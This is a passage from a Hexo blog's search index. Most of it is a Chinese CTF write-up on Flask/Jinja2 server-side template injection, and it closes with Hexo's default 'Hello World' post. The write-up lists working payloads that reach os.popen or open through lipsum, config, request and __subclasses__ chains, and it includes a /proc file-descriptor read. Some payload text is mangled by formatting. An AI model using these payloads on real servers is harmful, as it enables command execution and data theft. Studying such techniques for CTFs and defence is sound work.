实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：[a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。](http://a.xxx/a.xxx()%EF%BC%<span class="number">89</span>%EF%BC%8C%E9%<span class="number">83</span>%BD%E4%BC%9A%E8%<span class="number">87</span>%AA%E5%8A%A8%E5%8E%BB%E8%B0%<span class="number">83</span>%E7%<span class="number">94</span>%A8__getattribute__%E6%<span class="number">96</span>%B9%E6%B3%<span class="number">95</span>%E3%<span class="number">80</span>%<span class="number">82</span>%E5%9B%A0%E6%AD%A4%E6%<span class="number">88</span>%<span class="number">91</span>%E4%BB%AC%E5%<span class="number">90</span>%8C%E6%A0%B7%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E9%<span class="number">80</span>%9A%E8%BF%<span class="number">87</span>%E8%BF%<span class="number">99</span>%E4%B8%AA%E6%<span class="number">96</span>%B9%E6%B3%<span class="number">95</span>%E6%9D%A5%E8%8E%B7%E5%8F%<span class="number">96</span>%E5%<span class="number">88</span>%B0%E5%AE%9E%E4%BE%8B%E3%<span class="number">80</span>%<span class="number">81</span>%E7%B1%BB%E3%<span class="number">80</span>%<span class="number">81</span>%E5%<span class="number">87</span>%BD%E6%<span class="number">95</span>%B0%E7%9A%<span class="number">84</span>%E5%B1%9E%E6%<span class="number">80</span>%A7%E3%<span class="number">80</span>%<span class="number">82</span>)getitem()        调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="string">&#x27;b&#x27;</span>]，就是a.getitem(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">builtins         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line"><span class="keyword">import</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="keyword">import</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line"><span class="built_in">str</span>()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins，而且url_for.<span class="built_in">globals</span>[<span class="string">&#x27;builtins&#x27;</span>]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins**，而且url_for.**<span class="built_in">globals</span>**[<span class="string">&#x27;**builtins**&#x27;</span>]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.**<span class="built_in">globals</span>**[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取<span class="built_in">open</span>函数:request.**init**.**<span class="built_in">globals</span>**[<span class="string">&#x27;**builtins**&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1    get传参</span><br><span class="line">request.values.x1  所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1    post传参(Content-<span class="type">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data   post传参(Content-<span class="type">Type</span>:a/b)</span><br><span class="line">request.json post传json  (Content-<span class="type">Type</span>: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.**<span class="keyword">class</span>**.**init**.**<span class="built_in">globals</span>**[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of <span class="string">&#x27;flask_ssti&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><blockquote><p>三、常用类</p><p>先举几个基础的例子方便理解：<br>1、<strong>class</strong></p><p>__class__用来查看变量所属的类，格式为变量<code>.__**class__**</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line">().__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line">&#123;&#125;.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line">[].__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、<strong>base</strong></p><p>__base__用来查看类的基类，注意是类的基类，所以格式为变量<code>.__**class__**.__**base__**</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.__base__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line">().<span class="keyword">class</span>.__base__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.<span class="keyword">class</span>.__base__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line">[].<span class="keyword">class</span>.__base__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br></pre></td></tr></table></figure><p>同时也能加上数组，比如变量<code>.__**class__**.__**base__**[0]</code>来获得第一个基类。</p><p>值得一提的是还有个类是<code>__mro__</code>，它会显示类和基类，这是它和<code>__base__</code>的不同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure><p>3、<strong>subclasses</strong>()</p><p>**<code>subclasses**()</code>查看当前类的子类，格式变量<code>.__**class__**.__**base__**[0].__**subclasses__**()</code><br>这个类也可以加数组来查看指定的索引值，例如变量<code>.__**class__**.__**bases__**[0].__**subclasses__**()[1]</code><br>在这里插入图片描述</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>].__subclasses__()[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>这个时候就可以开始利用类里面的方法了。</p><p>示例：<code>变量.__**class__**.__**bases__**[0].__subclasses__()[138].__**init__**.__**globals__**</code>，init初始化类，然后globals全局来查找所有的方法及变量及参数。</p><p>由此我们可以看到各种各样的参数方法函数，去找一个可利用的function来执行，比如popen的话，就可以这样利用：<code>&#39;&#39;.__**class__**.__**bases__**[0].__**subclasses__**()[138].__**init__**.__**globals__[**&#39;popen&#39;].read()</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/06/26/hello-world/"/>
      <url>/2023/06/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
